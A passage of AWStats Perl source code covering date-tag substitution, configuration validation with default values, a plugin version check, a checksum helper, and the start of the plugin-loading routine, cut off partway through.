            $SourceString =~ s/%WY-$timephase/$olderweekofyear/g;
            next;
        }
        if ( $timetag eq 'Wy' ) {
            my $olderweekofyear0 = sprintf( "%02d", $olderweekofyear - 1 );
            $SourceString =~ s/%Wy-$timephase/$olderweekofyear0/g;
            next;
        }
        if ( $timetag eq 'DW' ) {
            $SourceString =~ s/%DW-$timephase/$olderwday/g;
            next;
        }
        if ( $timetag eq 'Dw' ) {
            my $olderwday0 = $olderwday - 1;
            $SourceString =~ s/%Dw-$timephase/$olderwday0/g;
            next;
        }

        # If unknown tag
        error("Unknown tag '\%$timetag' in parameter.");
    }

    # Replace %YYYY %YY %MM %DD %HH with current value. Kept for backward compatibility.
    $SourceString =~ s/%YYYY/$nowyear/ig;
    $SourceString =~ s/%YY/$nowsmallyear/ig;
    $SourceString =~ s/%MM/$nowmonth/ig;
    $SourceString =~ s/%MO/$MonthNumLibEn{$nowmonth}/ig;
    $SourceString =~ s/%DD/$nowday/ig;
    $SourceString =~ s/%HH/$nowhour/ig;
    $SourceString =~ s/%NS/$nowns/ig;
    $SourceString =~ s/%WM/$nowweekofmonth/g;
    my $nowweekofmonth0 = $nowweekofmonth - 1;
    $SourceString =~ s/%Wm/$nowweekofmonth0/g;
    $SourceString =~ s/%WY/$nowweekofyear/g;
    my $nowweekofyear0 = $nowweekofyear - 1;
    $SourceString =~ s/%Wy/$nowweekofyear0/g;
    $SourceString =~ s/%DW/$nowwday/g;
    my $nowwday0 = $nowwday - 1;
    $SourceString =~ s/%Dw/$nowwday0/g;

    return $SourceString;
}

#------------------------------------------------------------------------------
# Function:     Check if all parameters are correctly defined. If not set them to default.
# Parameters:	None
# Input:		All global variables
# Output:		Change on some global variables
# Return:		None
#------------------------------------------------------------------------------
sub Check_Config {
    if ($Debug) { debug("Call to Check_Config"); }

    # Show initial values of main parameters before check
    if ($Debug) {
        debug( " LogFile='$LogFile'",           2 );
        debug( " LogType='$LogType'",           2 );
        debug( " LogFormat='$LogFormat'",       2 );
        debug( " LogSeparator='$LogSeparator'", 2 );
        debug( " DNSLookup='$DNSLookup'",       2 );
        debug( " DirData='$DirData'",           2 );
        debug( " DirCgi='$DirCgi'",             2 );
        debug( " DirIcons='$DirIcons'",         2 );
        debug( " NotPageList " .    ( join( ',', keys %NotPageList ) ),    2 );
        debug( " ValidHTTPCodes " . ( join( ',', keys %ValidHTTPCodes ) ), 2 );
        debug( " ValidSMTPCodes " . ( join( ',', keys %ValidSMTPCodes ) ), 2 );
        debug( " UseFramesWhenCGI=$UseFramesWhenCGI",     2 );
        debug( " BuildReportFormat=$BuildReportFormat",   2 );
        debug( " BuildHistoryFormat=$BuildHistoryFormat", 2 );
        debug(
            " URLWithQueryWithOnlyFollowingParameters="
                . ( join( ',', @URLWithQueryWithOnly ) ),
            2
        );
        debug(
            " URLWithQueryWithoutFollowingParameters="
                . ( join( ',', @URLWithQueryWithout ) ),
            2
        );
    }

    # Main section
    $LogFile = &Substitute_Tags($LogFile);
    if ( !$LogFile ) {
        error("LogFile parameter is not defined in config/domain file");
    }
    if ( $LogType !~ /[WSMF]/i ) { $LogType = 'W'; }
    $LogFormat =~ s/\\//g;
    if ( !$LogFormat ) {
        error("LogFormat parameter is not defined in config/domain file");
    }
    if ( $LogFormat =~ /^\d$/ && $LogFormat !~ /[1-6]/ ) {
        error(
            "LogFormat parameter is wrong in config/domain file. Value is '$LogFormat' (should be 1,2,3,4,5 or a 'personalized AWStats log format string')"
        );
    }
    $LogSeparator ||= "\\s";
    $DirData      ||= '.';
    $DirCgi       ||= '/cgi-bin';
    $DirIcons     ||= '/icon';
    if ( $DNSLookup !~ /[0-2]/ ) {
        error(
            "DNSLookup parameter is wrong in config/domain file. Value is '$DNSLookup' (should be 0,1 or 2)"
        );
    }
    if ( !$SiteDomain ) {
        error(
            "SiteDomain parameter not defined in your config/domain file. You must edit it for using this version of AWStats."
        );
    }
    if ( $AllowToUpdateStatsFromBrowser !~ /[0-1]/ ) {
        $AllowToUpdateStatsFromBrowser = 0;
    }
    if ( $AllowFullYearView !~ /[0-3]/ ) { $AllowFullYearView = 2; }

    # Optional setup section
    if ( !$SectionsToBeSaved )             { $SectionsToBeSaved   = 'all'; }
    if ( $EnableLockForUpdate !~ /[0-1]/ ) { $EnableLockForUpdate = 0; }
    $DNSStaticCacheFile     ||= 'dnscache.txt';
    $DNSLastUpdateCacheFile ||= 'dnscachelastupdate.txt';
    if ( $DNSStaticCacheFile eq $DNSLastUpdateCacheFile ) {
        error(
            "DNSStaticCacheFile and DNSLastUpdateCacheFile must have different values."
        );
    }
    if ( $AllowAccessFromWebToAuthenticatedUsersOnly !~ /[0-1]/ ) {
        $AllowAccessFromWebToAuthenticatedUsersOnly = 0;
    }
    if ( $CreateDirDataIfNotExists !~ /[0-1]/ ) {
        $CreateDirDataIfNotExists = 0;
    }
    if ( $BuildReportFormat !~ /html|xhtml|xml/i ) {
        $BuildReportFormat = 'html';
    }
    if ( $BuildHistoryFormat !~ /text|xml/ ) { $BuildHistoryFormat = 'text'; }
    if ( $SaveDatabaseFilesWithPermissionsForEveryone !~ /[0-1]/ ) {
        $SaveDatabaseFilesWithPermissionsForEveryone = 0;
    }
    if ( $PurgeLogFile !~ /[0-1]/ ) { $PurgeLogFile = 0; }
    if ( $KeepBackupOfHistoricFiles !~ /[0-1]/ ) {
        $KeepBackupOfHistoricFiles = 0;
    }
    $DefaultFile[0] ||= 'index.html';
    if ( $AuthenticatedUsersNotCaseSensitive !~ /[0-1]/ ) {
        $AuthenticatedUsersNotCaseSensitive = 0;
    }
    if ( $URLNotCaseSensitive !~ /[0-1]/ ) { $URLNotCaseSensitive = 0; }
    if ( $URLWithAnchor !~ /[0-1]/ )       { $URLWithAnchor       = 0; }
    $URLQuerySeparators =~ s/\s//g;
    if ( !$URLQuerySeparators )             { $URLQuerySeparators   = '?;'; }
    if ( $URLWithQuery !~ /[0-1]/ )         { $URLWithQuery         = 0; }
    if ( $URLReferrerWithQuery !~ /[0-1]/ ) { $URLReferrerWithQuery = 0; }
    if ( $WarningMessages !~ /[0-1]/ )      { $WarningMessages      = 1; }
    if ( $DebugMessages !~ /[0-1]/ )        { $DebugMessages        = 0; }

    if ( $NbOfLinesForCorruptedLog !~ /^\d+/ || $NbOfLinesForCorruptedLog < 1 )
    {
        $NbOfLinesForCorruptedLog = 50;
    }
    if ( $Expires !~ /^\d+/ )   { $Expires  = 0; }
    if ( $DecodeUA !~ /[0-1]/ ) { $DecodeUA = 0; }
    $MiscTrackerUrl ||= '/js/awstats_misc_tracker.js';

    # Optional accuracy setup section
    if ( $LevelForWormsDetection !~ /^\d+/ )  { $LevelForWormsDetection  = 0; }
    if ( $LevelForRobotsDetection !~ /^\d+/ ) { $LevelForRobotsDetection = 2; }
    if ( $LevelForBrowsersDetection !~ /^\w+/ ) {
        $LevelForBrowsersDetection = 2;
    }    # Can be 'allphones'
    if ( $LevelForOSDetection !~ /^\d+/ )    { $LevelForOSDetection    = 2; }
    if ( $LevelForRefererAnalyze !~ /^\d+/ ) { $LevelForRefererAnalyze = 2; }
    if ( $LevelForFileTypesDetection !~ /^\d+/ ) {
        $LevelForFileTypesDetection = 2;
    }
    if ( $LevelForSearchEnginesDetection !~ /^\d+/ ) {
        $LevelForSearchEnginesDetection = 2;
    }
    if ( $LevelForKeywordsDetection !~ /^\d+/ ) {
        $LevelForKeywordsDetection = 2;
    }

    # Optional extra setup section
    foreach my $extracpt ( 1 .. @ExtraName - 1 ) {
        if ( $ExtraStatTypes[$extracpt] !~ /[PHBL]/ ) {
            $ExtraStatTypes[$extracpt] = 'PHBL';
        }
        if (   $MaxNbOfExtra[$extracpt] !~ /^\d+$/
            || $MaxNbOfExtra[$extracpt] < 0 )
        {
            $MaxNbOfExtra[$extracpt] = 20;
        }
        if ( $MinHitExtra[$extracpt] !~ /^\d+$/ || $MinHitExtra[$extracpt] < 1 )
        {
            $MinHitExtra[$extracpt] = 1;
        }
        if ( !$ExtraFirstColumnValues[$extracpt] ) {
            error(
                "Extra section number $extracpt is defined without ExtraSectionFirstColumnValues$extracpt parameter"
            );
        }
        if ( !$ExtraFirstColumnFormat[$extracpt] ) {
            $ExtraFirstColumnFormat[$extracpt] = '%s';
        }
    }

    # Optional appearance setup section
    if ( $MaxRowsInHTMLOutput !~ /^\d+/ || $MaxRowsInHTMLOutput < 1 ) {
        $MaxRowsInHTMLOutput = 1000;
    }
    if ( $ShowMenu !~ /[01]/ )            { $ShowMenu       = 1; }
    if ( $ShowSummary !~ /[01UVPHB]/ )    { $ShowSummary    = 'UVPHB'; }
    if ( $ShowMonthStats !~ /[01UVPHB]/ ) { $ShowMonthStats = 'UVPHB'; }
    if ( $ShowDaysOfMonthStats !~ /[01VPHB]/ ) {
        $ShowDaysOfMonthStats = 'VPHB';
    }
    if ( $ShowDaysOfWeekStats !~ /[01PHBL]/ ) { $ShowDaysOfWeekStats = 'PHBL'; }
    if ( $ShowHoursStats !~ /[01PHBL]/ )      { $ShowHoursStats      = 'PHBL'; }
    if ( $ShowDomainsStats !~ /[01PHB]/ )     { $ShowDomainsStats    = 'PHB'; }
    if ( $ShowHostsStats !~ /[01PHBL]/ )      { $ShowHostsStats      = 'PHBL'; }

    if ( $ShowAuthenticatedUsers !~ /[01PHBL]/ ) {
        $ShowAuthenticatedUsers = 0;
    }
    if ( $ShowRobotsStats !~ /[01HBL]/ )     { $ShowRobotsStats     = 'HBL'; }
    if ( $ShowWormsStats !~ /[01HBL]/ )      { $ShowWormsStats      = 'HBL'; }
    if ( $ShowEMailSenders !~ /[01HBML]/ )   { $ShowEMailSenders    = 0; }
    if ( $ShowEMailReceivers !~ /[01HBML]/ ) { $ShowEMailReceivers  = 0; }
    if ( $ShowSessionsStats !~ /[01]/ )      { $ShowSessionsStats   = 1; }
    if ( $ShowPagesStats !~ /[01PBEX]/i )    { $ShowPagesStats      = 'PBEX'; }
    if ( $ShowFileTypesStats !~ /[01HBC]/ )  { $ShowFileTypesStats  = 'HB'; }
    if ( $ShowDownloadsStats !~ /[01HB]/ )   { $ShowDownloadsStats  = 'HB';}
    if ( $ShowFileSizesStats !~ /[01]/ )     { $ShowFileSizesStats  = 1; }
    if ( $ShowOSStats !~ /[01]/ )            { $ShowOSStats         = 1; }
    if ( $ShowBrowsersStats !~ /[01]/ )      { $ShowBrowsersStats   = 1; }
    if ( $ShowScreenSizeStats !~ /[01]/ )    { $ShowScreenSizeStats = 0; }
    if ( $ShowOriginStats !~ /[01PH]/ )      { $ShowOriginStats     = 'PH'; }
    if ( $ShowKeyphrasesStats !~ /[01]/ )    { $ShowKeyphrasesStats = 1; }
    if ( $ShowKeywordsStats !~ /[01]/ )      { $ShowKeywordsStats   = 1; }
    if ( $ShowClusterStats !~ /[01PHB]/ )    { $ShowClusterStats    = 0; }
    if ( $ShowMiscStats !~ /[01anjdfrqwp]/ ) { $ShowMiscStats       = 'a'; }
    if ( $ShowHTTPErrorsStats !~ /[01]/ )    { $ShowHTTPErrorsStats = 1; }
    if ( $ShowHTTPErrorsPageDetail !~ /[RH]/ ) { $ShowHTTPErrorsPageDetail = 'R'; }
    if ( $ShowSMTPErrorsStats !~ /[01]/ )    { $ShowSMTPErrorsStats = 0; }
    if ( $AddDataArrayMonthStats !~ /[01]/ ) { $AddDataArrayMonthStats = 1; }

    if ( $AddDataArrayShowDaysOfMonthStats !~ /[01]/ ) {
        $AddDataArrayShowDaysOfMonthStats = 1;
    }
    if ( $AddDataArrayShowDaysOfWeekStats !~ /[01]/ ) {
        $AddDataArrayShowDaysOfWeekStats = 1;
    }
    if ( $AddDataArrayShowHoursStats !~ /[01]/ ) {
        $AddDataArrayShowHoursStats = 1;
    }
    my @maxnboflist = (
        'Domain',           'HostsShown',
        'LoginShown',       'RobotShown',
        'WormsShown',       'PageShown',
        'OsShown',          'BrowsersShown',
        'ScreenSizesShown', 'RefererShown',
        'KeyphrasesShown',  'KeywordsShown',
        'EMailsShown',		'DownloadsShown'
    );
    my @maxnboflistdefaultval =
        ( 10, 10, 10, 10, 5, 10, 10, 10, 5, 10, 10, 10, 20 );
    foreach my $i ( 0 .. ( @maxnboflist - 1 ) ) {
        if (   !$MaxNbOf{ $maxnboflist[$i] }
            || $MaxNbOf{ $maxnboflist[$i] } !~ /^\d+$/
            || $MaxNbOf{ $maxnboflist[$i] } < 1 )
        {
            $MaxNbOf{ $maxnboflist[$i] } = $maxnboflistdefaultval[$i];
        }
    }
    my @minhitlist = (
        'Domain',     'Host',  'Login',     'Robot',
        'Worm',       'File',  'Os',        'Browser',
        'ScreenSize', 'Refer', 'Keyphrase', 'Keyword',
        'EMail',	  'Downloads'
    );
    my @minhitlistdefaultval = ( 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 );
    foreach my $i ( 0 .. ( @minhitlist - 1 ) ) {
        if (   !$MinHit{ $minhitlist[$i] }
            || $MinHit{ $minhitlist[$i] } !~ /^\d+$/
            || $MinHit{ $minhitlist[$i] } < 1 )
        {
            $MinHit{ $minhitlist[$i] } = $minhitlistdefaultval[$i];
        }
    }
    if ( $FirstDayOfWeek !~ /[01]/ )   { $FirstDayOfWeek   = 1; }
    if ( $UseFramesWhenCGI !~ /[01]/ ) { $UseFramesWhenCGI = 1; }
    if ( $DetailedReportsOnNewWindows !~ /[012]/ ) {
        $DetailedReportsOnNewWindows = 1;
    }
    if ( $ShowLinksOnUrl !~ /[01]/ ) { $ShowLinksOnUrl = 1; }
    if ( $MaxLengthOfShownURL !~ /^\d+/ || $MaxLengthOfShownURL < 1 ) {
        $MaxLengthOfShownURL = 64;
    }
    if ( $ShowLinksToWhoIs !~ /[01]/ ) { $ShowLinksToWhoIs = 0; }
    $Logo     ||= 'awstats_logo6.png';
    $LogoLink ||= 'https://www.awstats.org';
    if ( $BarWidth !~ /^\d+/  || $BarWidth < 1 )  { $BarWidth  = 260; }
    if ( $BarHeight !~ /^\d+/ || $BarHeight < 1 ) { $BarHeight = 90; }
    $color_Background =~ s/#//g;
    if ( $color_Background !~ /^[0-9|A-H]+$/i ) {
        $color_Background = 'FFFFFF';
    }
    $color_TableBGTitle =~ s/#//g;

    if ( $color_TableBGTitle !~ /^[0-9|A-H]+$/i ) {
        $color_TableBGTitle = 'CCCCDD';
    }
    $color_TableTitle =~ s/#//g;
    if ( $color_TableTitle !~ /^[0-9|A-H]+$/i ) {
        $color_TableTitle = '000000';
    }
    $color_TableBG =~ s/#//g;
    if ( $color_TableBG !~ /^[0-9|A-H]+$/i ) { $color_TableBG = 'CCCCDD'; }
    $color_TableRowTitle =~ s/#//g;
    if ( $color_TableRowTitle !~ /^[0-9|A-H]+$/i ) {
        $color_TableRowTitle = 'FFFFFF';
    }
    $color_TableBGRowTitle =~ s/#//g;
    if ( $color_TableBGRowTitle !~ /^[0-9|A-H]+$/i ) {
        $color_TableBGRowTitle = 'ECECEC';
    }
    $color_TableBorder =~ s/#//g;
    if ( $color_TableBorder !~ /^[0-9|A-H]+$/i ) {
        $color_TableBorder = 'ECECEC';
    }
    $color_text =~ s/#//g;
    if ( $color_text !~ /^[0-9|A-H]+$/i ) { $color_text = '000000'; }
    $color_textpercent =~ s/#//g;
    if ( $color_textpercent !~ /^[0-9|A-H]+$/i ) {
        $color_textpercent = '606060';
    }
    $color_titletext =~ s/#//g;
    if ( $color_titletext !~ /^[0-9|A-H]+$/i ) { $color_titletext = '000000'; }
    $color_weekend =~ s/#//g;
    if ( $color_weekend !~ /^[0-9|A-H]+$/i ) { $color_weekend = 'EAEAEA'; }
    $color_link =~ s/#//g;
    if ( $color_link !~ /^[0-9|A-H]+$/i ) { $color_link = '0011BB'; }
    $color_hover =~ s/#//g;
    if ( $color_hover !~ /^[0-9|A-H]+$/i ) { $color_hover = '605040'; }
    $color_other =~ s/#//g;
    if ( $color_other !~ /^[0-9|A-H]+$/i ) { $color_other = '666688'; }
    $color_u =~ s/#//g;
    if ( $color_u !~ /^[0-9|A-H]+$/i ) { $color_u = 'FFA060'; }
    $color_v =~ s/#//g;
    if ( $color_v !~ /^[0-9|A-H]+$/i ) { $color_v = 'F4F090'; }
    $color_p =~ s/#//g;
    if ( $color_p !~ /^[0-9|A-H]+$/i ) { $color_p = '4477DD'; }
    $color_h =~ s/#//g;
    if ( $color_h !~ /^[0-9|A-H]+$/i ) { $color_h = '66EEFF'; }
    $color_k =~ s/#//g;
    if ( $color_k !~ /^[0-9|A-H]+$/i ) { $color_k = '2EA495'; }
    $color_s =~ s/#//g;
    if ( $color_s !~ /^[0-9|A-H]+$/i ) { $color_s = '8888DD'; }
    $color_e =~ s/#//g;
    if ( $color_e !~ /^[0-9|A-H]+$/i ) { $color_e = 'CEC2E8'; }
    $color_x =~ s/#//g;
    if ( $color_x !~ /^[0-9|A-H]+$/i ) { $color_x = 'C1B2E2'; }

    # Correct param if default value is asked
    if ( $ShowSummary            eq '1' ) { $ShowSummary            = 'UVPHB'; }
    if ( $ShowMonthStats         eq '1' ) { $ShowMonthStats         = 'UVPHB'; }
    if ( $ShowDaysOfMonthStats   eq '1' ) { $ShowDaysOfMonthStats   = 'VPHB'; }
    if ( $ShowDaysOfWeekStats    eq '1' ) { $ShowDaysOfWeekStats    = 'PHBL'; }
    if ( $ShowHoursStats         eq '1' ) { $ShowHoursStats         = 'PHBL'; }
    if ( $ShowDomainsStats       eq '1' ) { $ShowDomainsStats       = 'PHB'; }
    if ( $ShowHostsStats         eq '1' ) { $ShowHostsStats         = 'PHBL'; }
    if ( $ShowEMailSenders       eq '1' ) { $ShowEMailSenders       = 'HBML'; }
    if ( $ShowEMailReceivers     eq '1' ) { $ShowEMailReceivers     = 'HBML'; }
    if ( $ShowAuthenticatedUsers eq '1' ) { $ShowAuthenticatedUsers = 'PHBL'; }
    if ( $ShowRobotsStats        eq '1' ) { $ShowRobotsStats        = 'HBL'; }
    if ( $ShowWormsStats         eq '1' ) { $ShowWormsStats         = 'HBL'; }
    if ( $ShowPagesStats         eq '1' ) { $ShowPagesStats         = 'PBEX'; }
    if ( $ShowFileTypesStats     eq '1' ) { $ShowFileTypesStats     = 'HB'; }
    if ( $ShowDownloadsStats     eq '1' ) { $ShowDownloadsStats     = 'HB';}
    if ( $ShowOriginStats        eq '1' ) { $ShowOriginStats        = 'PH'; }
    if ( $ShowClusterStats       eq '1' ) { $ShowClusterStats       = 'PHB'; }
    if ( $ShowMiscStats eq '1' ) { $ShowMiscStats = 'anjdfrqwp'; }

    # Convert extra sections data into @ExtraConditionType, @ExtraConditionTypeVal...
    foreach my $extranum ( 1 .. @ExtraName - 1 ) {
        my $part = 0;
        foreach my $conditioncouple (
            split( /\s*\|\|\s*/, $ExtraCondition[$extranum] ) )
        {
            my ( $conditiontype, $conditiontypeval ) =
                split( /[,:]/, $conditioncouple, 2 );
            $ExtraConditionType[$extranum][$part] = $conditiontype;
            if ( $conditiontypeval =~ /^REGEX\[(.*)\]$/i ) {
                $conditiontypeval = $1;
            }

            #else { $conditiontypeval=quotemeta($conditiontypeval); }
            $ExtraConditionTypeVal[$extranum][$part] = qr/$conditiontypeval/i;
            $part++;
        }
        $part = 0;
        foreach my $rowkeycouple (
            split( /\s*\|\|\s*/, $ExtraFirstColumnValues[$extranum] ) )
        {
            my ( $rowkeytype, $rowkeytypeval ) =
                split( /[,:]/, $rowkeycouple, 2 );
            $ExtraFirstColumnValuesType[$extranum][$part] = $rowkeytype;
            if ( $rowkeytypeval =~ /^REGEX\[(.*)\]$/i ) { $rowkeytypeval = $1; }

            #else { $rowkeytypeval=quotemeta($rowkeytypeval); }
            $ExtraFirstColumnValuesTypeVal[$extranum][$part] =
                qr/$rowkeytypeval/i;
            $part++;
        }
    }

    # Show definitive value for major parameters
    if ($Debug) {
        debug( " LogFile='$LogFile'",               2 );
        debug( " LogFormat='$LogFormat'",           2 );
        debug( " LogSeparator='$LogSeparator'",     2 );
        debug( " DNSLookup='$DNSLookup'",           2 );
        debug( " DirData='$DirData'",               2 );
        debug( " DirCgi='$DirCgi'",                 2 );
        debug( " DirIcons='$DirIcons'",             2 );
        debug( " SiteDomain='$SiteDomain'",         2 );
        debug( " MiscTrackerUrl='$MiscTrackerUrl'", 2 );
        foreach ( keys %MaxNbOf ) { debug( " MaxNbOf{$_}=$MaxNbOf{$_}", 2 ); }
        foreach ( keys %MinHit )  { debug( " MinHit{$_}=$MinHit{$_}",   2 ); }

        foreach my $extranum ( 1 .. @ExtraName - 1 ) {
            debug(
                " ExtraCodeFilter[$extranum] is array "
                    . join( ',', @{ $ExtraCodeFilter[$extranum] } ),
                2
            );
            debug(
                " ExtraConditionType[$extranum] is array "
                    . join( ',', @{ $ExtraConditionType[$extranum] } ),
                2
            );
            debug(
                " ExtraConditionTypeVal[$extranum] is array "
                    . join( ',', @{ $ExtraConditionTypeVal[$extranum] } ),
                2
            );
            debug(
                " ExtraFirstColumnFunction[$extranum] is array "
                    . join( ',', @{ $ExtraFirstColumnFunction[$extranum] } ),
                2
            );
            debug(
                " ExtraFirstColumnValuesType[$extranum] is array "
                    . join( ',', @{ $ExtraFirstColumnValuesType[$extranum] } ),
                2
            );
            debug(
                " ExtraFirstColumnValuesTypeVal[$extranum] is array "
                    . join( ',', @{ $ExtraFirstColumnValuesTypeVal[$extranum] } ),
                2
            );
        }
    }

    # Deny URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters both set
    if ( @URLWithQueryWithOnly && @URLWithQueryWithout ) {
        error(
            "URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters can't be both set at the same time"
        );
    }

    # Deny $ShowHTTPErrorsStats and $ShowSMTPErrorsStats both set
    if ( $ShowHTTPErrorsStats && $ShowSMTPErrorsStats ) {
        error(
            "ShowHTTPErrorsStats and ShowSMTPErrorsStats can't be both set at the same time"
        );
    }

    # Deny LogFile if contains a pipe and PurgeLogFile || ArchiveLogRecords set on
    if ( ( $PurgeLogFile || $ArchiveLogRecords ) && $LogFile =~ /\|\s*$/ ) {
        error(
            "A pipe in log file name is not allowed if PurgeLogFile and ArchiveLogRecords are not set to 0"
        );
    }

    # If not a migrate, check if DirData is OK
    if ( !$MigrateStats && !-d $DirData ) {
        if ($CreateDirDataIfNotExists) {
            if ($Debug) { debug( " Make directory $DirData", 2 ); }
            my $mkdirok = mkdir "$DirData", 0766;
            if ( !$mkdirok ) {
                error(
                    "$PROG failed to create directory DirData (DirData=\"$DirData\", CreateDirDataIfNotExists=$CreateDirDataIfNotExists)."
                );
            }
        }
        else {
            error(
                "AWStats database directory defined in config file by 'DirData' parameter ($DirData) does not exist or is not writable."
            );
        }
    }

    if ( $LogType eq 'S' ) { $NOTSORTEDRECORDTOLERANCE = 1000000; }
}

#------------------------------------------------------------------------------
# Function:     Common function used by init function of plugins
# Parameters:	AWStats version required by plugin
# Input:		$VERSION
# Output:		None
# Return: 		'' if ok, "Error: xxx" if error
#------------------------------------------------------------------------------
sub Check_Plugin_Version {
    my $PluginNeedAWStatsVersion = shift;
    if ( !$PluginNeedAWStatsVersion ) { return 0; }
    $VERSION =~ /^(\d+)\.(\d+)/;
    my $numAWStatsVersion = ( $1 * 1000 ) + $2;
    $PluginNeedAWStatsVersion =~ /^(\d+)\.(\d+)/;
    my $numPluginNeedAWStatsVersion = ( $1 * 1000 ) + $2;
    if ( $numPluginNeedAWStatsVersion > $numAWStatsVersion ) {
        return
            "Error: AWStats version $PluginNeedAWStatsVersion or higher is required. Detected $VERSION.";
    }
    return '';
}

#------------------------------------------------------------------------------
# Function:     Return a checksum for an array of string
# Parameters:	Array of string
# Input:		None
# Output:		None
# Return: 		Checksum number
#------------------------------------------------------------------------------
sub CheckSum {
    my $string   = shift;
    my $checksum = 0;

    #	use MD5;
    # 	$checksum = MD5->hexhash($string);
    my $i = 0;
    my $j = 0;
    while ( $i < length($string) ) {
        my $c = substr( $string, $i, 1 );
        $checksum += ( ord($c) << ( 8 * $j ) );
        if ( $j++ > 3 ) { $j = 0; }
        $i++;
    }
    return $checksum;
}

#------------------------------------------------------------------------------
# Function:     Load plugins files
# Parameters:	None
# Input:		$DIR @PluginsToLoad
# Output:		None
# Return: 		None
#------------------------------------------------------------------------------
sub Read_Plugins {

    # Check plugin files in common possible directories :
    # Windows and standard package:        		"$DIR/plugins" (plugins in same dir than awstats.pl)
    # Redhat :                                  "/usr/local/awstats/wwwroot/cgi-bin/plugins"
    # Debian package :                    		"/usr/share/awstats/plugins"
    my @PossiblePluginsDir = (
        "$DIR/plugins",
        "/usr/local/awstats/wwwroot/cgi-bin/plugins",
        "/usr/share/awstats/plugins"
    );
    my %DirAddedInINC = ();

    #Removed for security reason
    #foreach my $key (keys %NoLoadPlugin) { if ($NoLoadPlugin{$key} < 0) { push @PluginsToLoad, $key; } }
    if ($Debug) {
        debug(
            "Call to Read_Plugins with list: " . join( ',', @PluginsToLoad ) );
    }
    foreach my $plugininfo (@PluginsToLoad) {
        my ( $pluginfile, $pluginparam ) = split( /\s+/, $plugininfo, 2 );
        $pluginparam ||=
            "";    # If split has only on part, pluginparam is not initialized
        $pluginfile =~ s/\.pm$//i;
        $pluginfile =~ /([^\/\\]+)$/;
        $pluginfile = Sanitize($1);     # pluginfile is cleaned from any path for security reasons and from .pm
        my $pluginname = $pluginfile;
        if ( $NoLoadPlugin{$pluginname} && $NoLoadPlugin{$pluginname} > 0 ) {
            if ($Debug) {
                debug(
                    " Plugin load for '$pluginfile' has been disabled from parameters"
                );
            }
            next;
        }
        if ($pluginname) {
            if ( !$PluginsLoaded{'init'}{"$pluginname"} )
            {                   # Plugin not already loaded
                my %pluginisfor = (
                    'timehires'            => 'u',
                    'ipv6'                 => 'u',
                    'hashfiles'            => 'u',
                    'geoipfree'            => 'u',
                    'geoip'                => 'ou',
                    'geoip6'               => 'ou',
                    'geoip2_country'       => 'ou',
                    'geoip_region_maxmind' => 'mou',
                    'geoip_city_maxmind'   => 'mou',
                    'geoip2_city'          => 'mou',
                    'geoip_isp_maxmind'    => 'mou',
                    'geoip_org_maxmind'    => 'mou',
                    'timezone'             => 'ou',
                    'decodeutfkeys'        => 'o',
                    'hostinfo'             => 'o',
                    'rawlog'               => 'o',
                    'userinfo'             => 'o',
                    'urlalias'             => 'o',
                    'tooltips'             => 'o'
                );
                if ( $pluginisfor{$pluginname} )
                {    # If it's a known plugin, may be we don't need to load it
                    # Do not load "menu handler plugins" if output only and mainleft frame
                    if (   !$UpdateStats
                        && scalar keys %HTMLOutput
                        && $FrameName eq 'mainleft'
                        && $pluginisfor{$pluginname} !~ /m/ )
                    {
                        $PluginsLoaded{'init'}{"$pluginname"} = 1;
                        next;
                    }

                    # Do not load "update plugins" if output only
                    if (   !$UpdateStats
                        && scalar keys %HTMLOutput
                        && $pluginisfor{$pluginname} !~ /o/ )
                    {
                        $PluginsLoaded{'init'}{"$pluginname"} = 1;
                        next;
                    }

                    # Do not load "output plugins" if update only
                    if (   $UpdateStats
                        && !scalar keys %HTMLOutput
                        && $pluginisfor{$pluginname} !~ /u/ )
                    {
                        $PluginsLoaded{'init'}{"$pluginname"} = 1;
                        next;
                    }
                }

                # Load plugin
                foreach my $dir (@PossiblePluginsDir) {
                    my $searchdir = $dir;
                    if (   $searchdir
                        && ( !( $searchdir =~ /\/$/ ) )
                        && ( !( $searchdir =~ /\\$/ ) ) )
                    {
                        $searchdir .= "/";
                    }
                    my $pluginpath = "${searchdir}${pluginfile}.pm";
                    if ( -s "$pluginpath" ) {
                        $PluginDir = "${searchdir}";    # Set plugin dir
                        if ($Debug) {
                            debug(
                                " Try to init plugin '$pluginname' ($pluginpath) with param '$pluginparam'",
                                1
                            );
                        }
                        if ( !$DirAddedInINC{"$dir"} ) {
                            push @INC, "$dir";
                            $DirAddedInINC{"$dir"} = 1;
                        }
                        my $loadret = 0;
                        my $modperl = $ENV{"MOD_PERL"}
                            ? eval {
                            require mod_perl;
                            $mod_perl::VERSION >= 1.99 ? 2 : 1;
                        }
                            : 0;
                        if ( $modperl == 2 ) {
                            $loadret = require "$pluginpath";
                        }
                        else { $loadret = require "$pluginfile.pm"; }
                        if ( !$loadret || $loadret =~ /^error/i ) {

                            # Load failed, we stop here
                            error(
                                "Plugin load for plugin '$pluginname' failed with return code: $loadret"
                            );
                        }
                        my $ret;    # To get init return
                        my $initfunction =
                            "\$ret=Init_$pluginname('$pluginparam')";		# Note that pluginname and pluginparam were sanitized when reading cong file entry 'LoadPlugin'
                        my $initret = eval("$initfunction");
                        if ( $initret && $initret eq 'xxx' ) {
                            $initret =
                                'Error: The PluginHooksFunctions variable defined in plugin file does not contain list of hooked functions';
                        }
                        if ( !$initret || $initret =~ /^error/i ) {

                            # Init function failed, we stop here
                            error(
                                "Plugin init for plugin '$pluginname' failed with return code: "
                                    . (
                                    $initret
                                        ? "$initret"
                                        : "$@ (A module required by plugin might be missing)."
                                )
                            );
                        }

                        # Plugin load and init successful
                        foreach my $elem ( split( /\s+/, $initret ) ) {

                            # Some functions can only be plugged once
                            my @uniquefunc = (
                                'GetCountryCodeByName',
                                'GetCountryCodeByAddr',
                                'ChangeTime',
                                'GetTimeZoneTitle',
                                'GetTime',
                                'SearchFile',
                                'LoadCache',
                                'SaveHash',
                                'ShowMenu'
                            );
                            my $isuniquefunc = 0;
                            foreach my $function (@uniquefunc) {
                                if ( "$elem" eq "$function" ) {

                                    # We try to load a 'unique' function, so we check and stop if already loaded
                                    foreach my $otherpluginname (
                                        keys %{ $PluginsLoaded{"$elem"} } )
                                    {
                                        error(
                                            "Conflict between plugin '$pluginname' and '$otherpluginname'. They both implements the 'must be unique' function '$elem'.\nYou must choose between one of them. Using together is not possible."
                                        );
                                    }
                                    $isuniquefunc = 1;
                                    last;
                                }
                            }
                            if ($isuniquefunc) {

